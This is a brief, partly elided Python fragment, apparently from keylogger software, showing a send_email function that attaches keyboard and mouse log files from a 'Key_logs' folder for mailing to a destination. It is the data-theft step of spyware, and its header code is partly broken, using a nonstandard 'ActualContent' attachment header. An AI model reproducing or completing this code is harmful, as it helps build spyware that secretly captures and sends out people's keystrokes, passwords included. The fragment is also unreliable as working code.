...
def send_email(subject, message, destination):
    ...
    msg.add_header('Content-Disposition', 'attachment', filename='logger/Key_logs/keyboard_logs.txt')
    msg.add_header('ActualContent', 'attachment', filename='logger/Key_logs/mouse_logs.txt')
    msg['Subject'] = subject
